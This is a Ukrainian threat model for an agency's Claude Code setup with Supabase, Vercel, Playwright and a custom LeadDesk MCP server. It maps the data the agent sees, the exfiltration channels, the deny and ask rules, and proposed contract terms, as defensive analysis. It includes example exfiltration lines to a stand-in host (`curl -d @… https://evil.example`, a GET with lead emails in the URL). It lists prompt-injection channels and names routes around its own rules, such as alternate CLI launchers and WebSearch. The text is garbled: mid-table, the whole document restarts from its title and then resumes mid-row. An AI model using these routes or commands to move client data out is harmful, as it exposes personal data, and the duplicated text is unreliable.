# Threat model: MCP-інтеграції LeadDesk (Task D)

Спирається на закомічені [`.mcp.json`](../../.mcp.json), [`.claude/settings.json`](../../.claude/settings.json),
профілі [`docs/mcp/profiles/`](profiles/) і сервер [`mcp/leaddesk-server/`](../../mcp/leaddesk-server/), а також на те,
що ми бачили в сесіях Task B і C ([`connections.md`](connections.md), [`verification.md`](verification.md),
[`ab-generic-vs-domain.md`](ab-generic-vs-domain.md)). Посилання «рядок N» — на ці файли.

## Які дані бачить агент

| Сервер | Що потрапляє в контекст агента | Чиї це дані | Чи є там текст, який написали треті особи |
|---|---|---|---|
| `supabase` | Будь-який рядок бази проєкту через `execute_sql`: у `leads` — ПІБ, email, бюджет і текст заявки кожного ліда; схема, політики RLS і права ролей (прогін A сам прочитав `pg_policies` і права `anon`/`authenticated`); URL і publishable key проєкту (група `development`); результати пошуку в документації Supabase | клієнта агенції та його лідів — кінцевих людей, які залишили заявку | Так: `message`, ПІБ і назви компаній пишуть ліди через публічну форму. Supabase загортає результат у `<untrusted-data-…>` з попередженням не виконувати інструкцій, але сам пише, що це не гарантія |
| `vercel` | Проєкти, деплої, події й логи білду (у логу — назва репозиторію, коміт, вивід `npm install` і `next build`; білд може надрукувати й значення змінних оточення); команди акаунта з `list_teams` | агенції або клієнта — залежно від того, чий акаунт | Так: повідомлення комітів, вивід сторонніх npm-пакетів у лозі (у нашому — їхні deprecation-повідомлення), toolbar-листування з клієнтом, якщо його прочитати |
| `playwright` | Усе, що показує відкрита сторінка: DOM, консоль, перелік мережевих запитів, через `browser_network_request` — заголовки й тіла запитів, зокрема cookie; знімки в `.playwright-mcp/`. На `http://localhost:3000` — форма заявки і все, що агент у неї вводить | власника сторінки та людей, чиї дані сторінка показує | Так: будь-який текст на сторінці, зокрема з іншого сайту після редиректу. Це головний канал prompt injection для браузерного сервера |
| `leaddesk` | Лише `id`, `company`, `status`, `source`, `budget`, `createdAt` (`pick`, `mcp/leaddesk-server/src/leaddesk.mjs`, рядок 20), ресурс зі статусами, записи аудиту з причиною, яку пише сам агент | клієнта агенції (ліди) | Майже ні: лише назви компаній. Імені, email і тексту заявки інструменти не віддають (у прогоні B агент сам написав: «Імен і email інструмент не повертає») |

## Канали виносу в цій же сесії

Щонайменше три канали **з нашого конфіга**; не браузерних тут більшість.

| Канал | Звідки (сервер або вбудований інструмент) | Як ним можна винести дані | Закрито? Чим саме |
|---|---|---|---|
| `WebFetch` | вбудований інструмент Claude Code | GET на адресу зловмисника з даними в URL (`https://evil.example/?d=` + email лідів) | Так: `"WebFetch"` у `deny` (`.claude/settings.json`, рядок 16). `WebSearch` у `deny` немає — пошуковий запит теж може нести дані; це відкритий залишок |
| `Bash` (`curl`, `nc`, `git push`, `npx` будь-якого пакета) | вбудований інструмент Claude Code | `curl -d @… https://evil.example`; `git push` у форк, який Vercel сам деплоїть через git-інтеграцію (публічний preview); запуск будь-якого пакета з npm | Частково: `defaultMode: "default"` (рядок 3) — команди, що не лише читають, ідуть через запит на схвалення (у перевірці форми так спитали навіть про `curl` на localhost). Команди лише на читання в теці сесії (`ls`, `grep`) Claude Code виконує без діалогу — так було в обох прогонах A/B |
| `use_vercel_cli` → `Bash` → `vercel env pull`, `vercel deploy` | `vercel` + вбудований `Bash` | інструмент Vercel MCP скеровує модель у локальний CLI під CLI-токеном: `env`, `deploy`, `rollback`, `promote`, `rm` | Так, двома шарами: CLI на машині не встановлено, а `Bash(vercel)`, `Bash(vercel *)`, `Bash(npx vercel *)`, `Bash(npx -y vercel *)` — у `deny` (рядки 17–20). Перевірено: у сесії з логом білду агент тричі спробував CLI, і тричі «Permission … has been denied» |
| `deploy_to_vercel` з `target: preview` | `vercel` | задеплоїти код, який віддає дані на публічний URL; `get_access_to_vercel_url` видає посилання в обхід Deployment Protection | Так: обидва в `deny` (рядки 9–10) разом з рештою 11 інструментів, що змінюють стан |
| toolbar-інструменти Vercel | `vercel` | написати дані в коментар, який бачить клієнт (`reply_to_toolbar_thread`, `edit_toolbar_message`) | Так: `deny` (рядки 12–15) |
| запис у публічну таблицю | `supabase` (`execute_sql`, `apply_migration`) | `INSERT` даних у таблицю без RLS — її читає будь-хто з publishable key (прогін A показав: у `public.leads` RLS вимкнено, `anon` має `SELECT`/`INSERT`/`UPDATE`/`DELETE`) | Частково: обидва інструменти в `ask` (рядки 28–29), «don't ask again» їх не відкриває. Але діалог для `INSERT` виглядає так само, як для `SELECT` («Execute SQL» + сирий SQL) |
| `browser_navigate`, `browser_fill_form` + `browser_click` | `playwright` | відкрити адресу з даними в URL або відправити чужу форму | Частково: усі в `ask` (рядки 31–34); `--allowed-origins http://localhost:3000` (`.mcp.json`, рядки 19–20) — вендор прямо пише, що це не межа безпеки й на редиректи не діє |
| HTTP-варіант сервера LeadDesk (бонус E1) | `mcp/leaddesk-server/src/http.mjs` | будь-який локальний процес викликає `leaddesk_find_leads` і `leaddesk_set_lead_status` без жодного діалогу | Частково: слухає лише `127.0.0.1` (рядок 31), гварди Host/Origin (рядки 20–21) закривають DNS rebinding і чужі сторінки в браузері, але автентифікації немає |

## Що ми забороняємо і чим саме

| Що заборонено | Механізм: deny, URL, прапорець, окремий акаунт, окрема сесія | Де це видно: файл і рядок | Чого цей механізм НЕ закриває |
|---|---|---|---|
| Інші проєкти й організації Supabase | URL: `project_ref=` | `.mcp.json`, рядок 5 | OAuth-токен ширший за URL: на екрані згоди Supabase запитав `organizations:read`, `projects:write`, `secrets:read`, `edge_functions:write`… — з ним Management API бачить усю організацію. Тому організація одноразова, у ній один проєкт |
| Інструменти акаунта, edge functions, гілки | URL: `features=database,development,docs` | `.mcp.json`, рядок 5 | `execute_sql` усе одно робить у базі все, що дозволяє роль: DDL, читання будь-яких таблиць і системних каталогів |
| Запис у прогоні A (Task C) | URL: `read_only=true&features=database,docs` (команда — в `ab-generic-vs-domain.md`) | `docs/mcp/ab-generic-vs-domain.md`, «Прогін A» | Читання всіх даних, зокрема ПІБ і текстів заявок, лишається; агент усе одно пробує писати (`UPDATE`, `ALTER TABLE … ENABLE ROW LEVEL SECURITY`) — зупиняє база, а не діалог |
| Автосхвалення SQL | `ask` на `execute_sql`, `apply_migration`; в `allow` — лише 3 інструменти читання | `.claude/settings.json`, рядки 28–29, 38–40 | Людина, яка натискає «Yes», не читаючи SQL: заголовок «Execute SQL» той самий для читання й запису, опис у діалозі обрізано на «Destructive statement…» |
| 11 інструментів Vercel, що змінюють стан | `deny` точними іменами | `.claude/settings.json`, рядки 5–15 | Нові інструменти, які Vercel додасть пізніше (правила за іменами); `git push` → автодеплой через git-інтеграцію; токен — це користувач Vercel цілком |
| Vercel CLI | `deny` на `Bash(vercel …)` + CLI не встановлено | `.claude/settings.json`, рядки 17–20; `connections.md` | Інші способи запуску (`pnpm dlx vercel`, `bunx vercel`, `npm exec`, абсолютний шлях) і прямі REST-запити `curl` з токеном |
| `WebFetch` | `deny` | `.claude/settings.json`, рядок 16 | `curl` через `Bash` (лише з діалогом), `WebSearch`, браузер |
| Виконання коду й читання файлів через браузер | `deny`: `browser_run_code_unsafe`, `webmcp_*`, `browser_file_upload`, `browser_drop`, `browser_evaluate` | `.claude/settings.json`, рядки 21–25 | `browser_fill_form` і `browser_navigate` (лише з діалогом) можуть відправити назовні те, що агент уже знає; `browser_network_request` повертає cookie й тіла запитів |
| Логіни й профіль справжнього браузера | `--isolated`; жодних `--user-data-dir`, `--extension`, `--cdp-endpoint` | `.mcp.json`, рядки 14–21 | Усе, що агент введе на сторінці під час сесії, і дані, які показує сам застосунок |
| Інструменти, які додає сторінка | `--no-webmcp` + `deny` `webmcp_*` | `.mcp.json`, рядок 18; `.claude/settings.json`, рядок 22 | Інструкції в тексті сторінки (prompt injection) — їх модель усе одно читає |
| «Тихе» оновлення пакетів | точні версії: `@playwright/mcp@0.0.82`, `@modelcontextprotocol/server` 2.1.0, `zod` 4.6.5 | `.mcp.json`, рядок 16; `mcp/leaddesk-server/package.json` | Скомпрометовану версію з тим самим номером; `npx` тягне Playwright із реєстру під час запуску, і його залежності lock-файлом не закріплені |
| Supabase разом із браузером, більше одного сервера з записом | `disabledMcpjsonServers` + окрема сесія на профіль: `--mcp-config docs/mcp/profiles/supabase.json` (`vercel.json`, `playwright.json`) `--strict-mcp-config` | `.claude/settings.json`, рядки 52–56; `docs/mcp/profiles/*.json` | `.claude/settings.local.json` сильніший: перший запуск `claude` сам записав туди `"enableAllProjectMcpServers": true` — ми його видалили. Чи поважає `claude -p` цей список, не перевіряли; `claude -p --mcp-config .mcp.json` підніме всі три |
| Конектори claude.ai і VS Code в сесії | змінні `ENABLE_CLAUDEAI_MCP_SERVERS=false`, `CLAUDE_CODE_AUTO_CONNECT_IDE=false` у команді запуску | `connections.md`, «Сесії» | Це домовленість, а не конфіг: забули змінну — у сесії конектори акаунта (CRM, автоматизації з правом запису) або VS Code (так сталося в сесії міграції: «Opened changes in Visual Studio Code») |
| Персональні дані лідів у відповіді LeadDesk | `pick` — лише 6 полів | `mcp/leaddesk-server/src/leaddesk.mjs`, рядок 20 | Назви компаній і бюджети — теж дані клієнта; причину в аудит пише агент власним текстом |
| Довільні зміни статусу | `z.enum` статусів, `^lead_\d{4}$`, відмова для `new`, аудит, `ask` на `leaddesk_set_lead_status` | `leaddesk.mjs`, рядки 110 (опис «ЗМІНЮЄ ДАНІ»), 114 (`^lead_\d{4}# Threat model: MCP-інтеграції LeadDesk (Task D)

Спирається на закомічені [`.mcp.json`](../../.mcp.json), [`.claude/settings.json`](../../.claude/settings.json),
профілі [`docs/mcp/profiles/`](profiles/) і сервер [`mcp/leaddesk-server/`](../../mcp/leaddesk-server/), а також на те,
що ми бачили в сесіях Task B і C ([`connections.md`](connections.md), [`verification.md`](verification.md),
[`ab-generic-vs-domain.md`](ab-generic-vs-domain.md)). Посилання «рядок N» — на ці файли.

## Які дані бачить агент

| Сервер | Що потрапляє в контекст агента | Чиї це дані | Чи є там текст, який написали треті особи |
|---|---|---|---|
| `supabase` | Будь-який рядок бази проєкту через `execute_sql`: у `leads` — ПІБ, email, бюджет і текст заявки кожного ліда; схема, політики RLS і права ролей (прогін A сам прочитав `pg_policies` і права `anon`/`authenticated`); URL і publishable key проєкту (група `development`); результати пошуку в документації Supabase | клієнта агенції та його лідів — кінцевих людей, які залишили заявку | Так: `message`, ПІБ і назви компаній пишуть ліди через публічну форму. Supabase загортає результат у `<untrusted-data-…>` з попередженням не виконувати інструкцій, але сам пише, що це не гарантія |
| `vercel` | Проєкти, деплої, події й логи білду (у логу — назва репозиторію, коміт, вивід `npm install` і `next build`; білд може надрукувати й значення змінних оточення); команди акаунта з `list_teams` | агенції або клієнта — залежно від того, чий акаунт | Так: повідомлення комітів, вивід сторонніх npm-пакетів у лозі (у нашому — їхні deprecation-повідомлення), toolbar-листування з клієнтом, якщо його прочитати |
| `playwright` | Усе, що показує відкрита сторінка: DOM, консоль, перелік мережевих запитів, через `browser_network_request` — заголовки й тіла запитів, зокрема cookie; знімки в `.playwright-mcp/`. На `http://localhost:3000` — форма заявки і все, що агент у неї вводить | власника сторінки та людей, чиї дані сторінка показує | Так: будь-який текст на сторінці, зокрема з іншого сайту після редиректу. Це головний канал prompt injection для браузерного сервера |
| `leaddesk` | Лише `id`, `company`, `status`, `source`, `budget`, `createdAt` (`pick`, `mcp/leaddesk-server/src/leaddesk.mjs`, рядок 20), ресурс зі статусами, записи аудиту з причиною, яку пише сам агент | клієнта агенції (ліди) | Майже ні: лише назви компаній. Імені, email і тексту заявки інструменти не віддають (у прогоні B агент сам написав: «Імен і email інструмент не повертає») |

## Канали виносу в цій же сесії

Щонайменше три канали **з нашого конфіга**; не браузерних тут більшість.

| Канал | Звідки (сервер або вбудований інструмент) | Як ним можна винести дані | Закрито? Чим саме |
|---|---|---|---|
| `WebFetch` | вбудований інструмент Claude Code | GET на адресу зловмисника з даними в URL (`https://evil.example/?d=` + email лідів) | Так: `"WebFetch"` у `deny` (`.claude/settings.json`, рядок 16). `WebSearch` у `deny` немає — пошуковий запит теж може нести дані; це відкритий залишок |
| `Bash` (`curl`, `nc`, `git push`, `npx` будь-якого пакета) | вбудований інструмент Claude Code | `curl -d @… https://evil.example`; `git push` у форк, який Vercel сам деплоїть через git-інтеграцію (публічний preview); запуск будь-якого пакета з npm | Частково: `defaultMode: "default"` (рядок 3) — команди, що не лише читають, ідуть через запит на схвалення (у перевірці форми так спитали навіть про `curl` на localhost). Команди лише на читання в теці сесії (`ls`, `grep`) Claude Code виконує без діалогу — так було в обох прогонах A/B |
| `use_vercel_cli` → `Bash` → `vercel env pull`, `vercel deploy` | `vercel` + вбудований `Bash` | інструмент Vercel MCP скеровує модель у локальний CLI під CLI-токеном: `env`, `deploy`, `rollback`, `promote`, `rm` | Так, двома шарами: CLI на машині не встановлено, а `Bash(vercel)`, `Bash(vercel *)`, `Bash(npx vercel *)`, `Bash(npx -y vercel *)` — у `deny` (рядки 17–20). Перевірено: у сесії з логом білду агент тричі спробував CLI, і тричі «Permission … has been denied» |
| `deploy_to_vercel` з `target: preview` | `vercel` | задеплоїти код, який віддає дані на публічний URL; `get_access_to_vercel_url` видає посилання в обхід Deployment Protection | Так: обидва в `deny` (рядки 9–10) разом з рештою 11 інструментів, що змінюють стан |
| toolbar-інструменти Vercel | `vercel` | написати дані в коментар, який бачить клієнт (`reply_to_toolbar_thread`, `edit_toolbar_message`) | Так: `deny` (рядки 12–15) |
| запис у публічну таблицю | `supabase` (`execute_sql`, `apply_migration`) | `INSERT` даних у таблицю без RLS — її читає будь-хто з publishable key (прогін A показав: у `public.leads` RLS вимкнено, `anon` має `SELECT`/`INSERT`/`UPDATE`/`DELETE`) | Частково: обидва інструменти в `ask` (рядки 28–29), «don't ask again» їх не відкриває. Але діалог для `INSERT` виглядає так само, як для `SELECT` («Execute SQL» + сирий SQL) |
| `browser_navigate`, `browser_fill_form` + `browser_click` | `playwright` | відкрити адресу з даними в URL або відправити чужу форму | Частково: усі в `ask` (рядки 31–34); `--allowed-origins http://localhost:3000` (`.mcp.json`, рядки 19–20) — вендор прямо пише, що це не межа безпеки й на редиректи не діє |
| HTTP-варіант сервера LeadDesk (бонус E1) | `mcp/leaddesk-server/src/http.mjs` | будь-який локальний процес викликає `leaddesk_find_leads` і `leaddesk_set_lead_status` без жодного діалогу | Частково: слухає лише `127.0.0.1` (рядок 31), гварди Host/Origin (рядки 20–21) закривають DNS rebinding і чужі сторінки в браузері, але автентифікації немає |

## Що ми забороняємо і чим саме

| Що заборонено | Механізм: deny, URL, прапорець, окремий акаунт, окрема сесія | Де це видно: файл і рядок | Чого цей механізм НЕ закриває |
|---|---|---|---|
| Інші проєкти й організації Supabase | URL: `project_ref=` | `.mcp.json`, рядок 5 | OAuth-токен ширший за URL: на екрані згоди Supabase запитав `organizations:read`, `projects:write`, `secrets:read`, `edge_functions:write`… — з ним Management API бачить усю організацію. Тому організація одноразова, у ній один проєкт |
| Інструменти акаунта, edge functions, гілки | URL: `features=database,development,docs` | `.mcp.json`, рядок 5 | `execute_sql` усе одно робить у базі все, що дозволяє роль: DDL, читання будь-яких таблиць і системних каталогів |
| Запис у прогоні A (Task C) | URL: `read_only=true&features=database,docs` (команда — в `ab-generic-vs-domain.md`) | `docs/mcp/ab-generic-vs-domain.md`, «Прогін A» | Читання всіх даних, зокрема ПІБ і текстів заявок, лишається; агент усе одно пробує писати (`UPDATE`, `ALTER TABLE … ENABLE ROW LEVEL SECURITY`) — зупиняє база, а не діалог |
| Автосхвалення SQL | `ask` на `execute_sql`, `apply_migration`; в `allow` — лише 3 інструменти читання | `.claude/settings.json`, рядки 28–29, 38–40 | Людина, яка натискає «Yes», не читаючи SQL: заголовок «Execute SQL» той самий для читання й запису, опис у діалозі обрізано на «Destructive statement…» |
| 11 інструментів Vercel, що змінюють стан | `deny` точними іменами | `.claude/settings.json`, рядки 5–15 | Нові інструменти, які Vercel додасть пізніше (правила за іменами); `git push` → автодеплой через git-інтеграцію; токен — це користувач Vercel цілком |
| Vercel CLI | `deny` на `Bash(vercel …)` + CLI не встановлено | `.claude/settings.json`, рядки 17–20; `connections.md` | Інші способи запуску (`pnpm dlx vercel`, `bunx vercel`, `npm exec`, абсолютний шлях) і прямі REST-запити `curl` з токеном |
| `WebFetch` | `deny` | `.claude/settings.json`, рядок 16 | `curl` через `Bash` (лише з діалогом), `WebSearch`, браузер |
| Виконання коду й читання файлів через браузер | `deny`: `browser_run_code_unsafe`, `webmcp_*`, `browser_file_upload`, `browser_drop`, `browser_evaluate` | `.claude/settings.json`, рядки 21–25 | `browser_fill_form` і `browser_navigate` (лише з діалогом) можуть відправити назовні те, що агент уже знає; `browser_network_request` повертає cookie й тіла запитів |
| Логіни й профіль справжнього браузера | `--isolated`; жодних `--user-data-dir`, `--extension`, `--cdp-endpoint` | `.mcp.json`, рядки 14–21 | Усе, що агент введе на сторінці під час сесії, і дані, які показує сам застосунок |
| Інструменти, які додає сторінка | `--no-webmcp` + `deny` `webmcp_*` | `.mcp.json`, рядок 18; `.claude/settings.json`, рядок 22 | Інструкції в тексті сторінки (prompt injection) — їх модель усе одно читає |
| «Тихе» оновлення пакетів | точні версії: `@playwright/mcp@0.0.82`, `@modelcontextprotocol/server` 2.1.0, `zod` 4.6.5 | `.mcp.json`, рядок 16; `mcp/leaddesk-server/package.json` | Скомпрометовану версію з тим самим номером; `npx` тягне Playwright із реєстру під час запуску, і його залежності lock-файлом не закріплені |
| Supabase разом із браузером, більше одного сервера з записом | `disabledMcpjsonServers` + окрема сесія на профіль: `--mcp-config docs/mcp/profiles/supabase.json` (`vercel.json`, `playwright.json`) `--strict-mcp-config` | `.claude/settings.json`, рядки 52–56; `docs/mcp/profiles/*.json` | `.claude/settings.local.json` сильніший: перший запуск `claude` сам записав туди `"enableAllProjectMcpServers": true` — ми його видалили. Чи поважає `claude -p` цей список, не перевіряли; `claude -p --mcp-config .mcp.json` підніме всі три |
| Конектори claude.ai і VS Code в сесії | змінні `ENABLE_CLAUDEAI_MCP_SERVERS=false`, `CLAUDE_CODE_AUTO_CONNECT_IDE=false` у команді запуску | `connections.md`, «Сесії» | Це домовленість, а не конфіг: забули змінну — у сесії конектори акаунта (CRM, автоматизації з правом запису) або VS Code (так сталося в сесії міграції: «Opened changes in Visual Studio Code») |
| Персональні дані лідів у відповіді LeadDesk | `pick` — лише 6 полів | `mcp/leaddesk-server/src/leaddesk.mjs`, рядок 20 | Назви компаній і бюджети — теж дані клієнта; причину в аудит пише агент власним текстом |
| Довільні зміни статусу | `z.enum` статусів, `^lead_\d{4}$`, відмова для `new`, аудит, `ask` на `leaddesk_set_lead_status` | ), 132 (відмова для `new`), 141–142 (запис аудиту); `.claude/settings.json`, рядок 30 | HTTP-варіант (E1) — без автентифікації й без діалогу; у теках поза репозиторієм правило `ask` не діє (там рятує лише режим `default`) |
| Робота з клієнтського акаунта | окремі одноразові акаунти Supabase і Vercel | `connections.md`, «Акаунти» | Помилку людини на екрані згоди: Supabase показує там усі організації акаунта, і вибрати можна не ту |

## Що пишемо в договір

- **Клієнтський проєкт до агента напряму не підключаємо; працюємо з окремого акаунта без клієнтських організацій.**
  Агент працює з копією: окремий проєкт Supabase із синтетичними або знеособленими даними, окрема команда Vercel без
  продакшн-проєктів клієнта, браузер — лише на локальному чи staging-стенді без входу в акаунти.
- **Які системи і з якими правами.** Supabase MCP — права розробника на одну базу-копію (`execute_sql`,
  `apply_migration`), тому ні клієнтові, ні його кінцевим користувачам такий доступ не видаємо ніколи, а до продакшн-бази
  його не підключаємо. Vercel MCP — лише читання деплоїв і логів; деплой робить людина через git. Браузер — лише
  перевірка сторінок. Доменні дії над даними клієнта — через вузький сервер на кшталт LeadDesk: два дієслова, статуси з
  переліку, аудит.
- **Чиї акаунти.** Окремий акаунт агенції на кожен проєкт, власник — названа людина з агенції; клієнтські організації
  й команди в ньому не тримаємо. OAuth-токени MCP відкликаємо після завершення робіт.
- **Куди їдуть дані клієнта.** Усе, що бачить агент (рядки бази, логи білду, вміст сторінок), іде провайдеру LLM
  (Anthropic) і вендорам MCP-серверів (Supabase, Vercel), бо запити й результати проходять через їхні сервери. Клієнт
  дає на це згоду; персональні дані кінцевих людей до агента не потрапляють, якщо є знеособлена копія.
- **Схвалення й аудит.** Кожна зміна даних — лише після схвалення людини в діалозі, без «always allow» для записуючих
  інструментів; кожна доменна зміна пише запис аудиту (хто, що, коли, чому).
- **Журнали сесій.** Транскрипти й журнали сесій містять дані клієнта; зберігаємо їх локально в агенції обмежений
  строк і в репозиторії не комітимо.
- **Текст третіх осіб — дані, а не команди.** Інструкції з рядків бази, логів чи сторінок агент не виконує; що такий
  текст може вплинути на модель, клієнт знає й приймає.
- **Інцидент.** Якщо токен MCP чи акаунт скомпрометовано — відкликаємо токени, ротуємо ключі проєкту й повідомляємо
  клієнта в узгоджений строк.
